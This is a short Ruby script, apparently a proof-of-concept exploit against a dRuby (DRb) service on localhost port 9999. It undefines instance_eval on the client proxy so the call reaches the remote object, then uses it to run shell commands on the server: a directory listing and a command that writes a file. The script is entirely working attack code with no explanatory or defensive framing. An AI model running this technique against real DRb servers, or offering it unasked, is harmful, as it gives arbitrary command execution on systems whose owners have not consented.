require 'drb/drb'
DRb.start_service
remote_object = DRbObject.new_with_uri('druby://localhost:9999')

class << remote_object
  undef :instance_eval
end

remote_object.instance_eval("`ls -al`")
remote_object.instance_eval("`echo knock knock > bad.txt`")
